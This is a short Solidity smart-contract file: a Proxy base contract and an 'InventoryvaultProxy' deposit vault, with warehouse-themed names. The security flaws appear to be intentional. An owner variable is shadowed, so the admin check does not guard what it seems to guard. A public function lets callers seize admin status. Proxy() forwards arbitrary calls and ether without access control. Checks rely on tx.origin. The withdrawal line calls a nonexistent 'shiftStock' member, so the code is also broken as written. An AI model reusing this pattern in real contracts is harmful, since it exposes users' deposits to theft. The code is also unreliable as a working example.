// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyWarehousemanager { if (msg.sender == LogisticsAdmin) _; } address LogisticsAdmin = msg.sender;
    function movegoodsWarehousemanager(address _depotowner) public onlyWarehousemanager { LogisticsAdmin = _depotowner; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract InventoryvaultProxy is Proxy {
    address public LogisticsAdmin;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function StorageVault() public payable {
        if (msg.sender == tx.origin) {
            LogisticsAdmin = msg.sender;
            storeGoods();
        }
    }

    function storeGoods() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function dispatchShipment(uint256 amount) public onlyWarehousemanager {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.shiftStock(amount);
        }
    }
}